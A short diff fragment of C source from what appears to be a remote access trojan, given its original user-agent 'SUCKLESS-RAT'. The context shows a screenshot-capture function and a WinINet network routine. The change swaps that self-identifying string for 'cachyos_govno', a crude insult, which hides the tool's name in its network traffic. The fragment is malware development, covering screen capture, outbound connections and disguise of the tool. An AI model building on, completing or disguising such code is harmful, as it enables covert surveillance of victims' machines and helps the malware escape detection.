@@ -249,7 +249,7 @@ static char* Screenshot(uint32_t* outLen) {
   return out;
 }
 static void FetchCountry() {
-  HINTERNET h = InternetOpenA("SUCKLESS-RAT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+  HINTERNET h = InternetOpenA("cachyos_govno", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
   if (!h) return;
   DWORD t = 3000;
   InternetSetOptionA(h, INTERNET_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
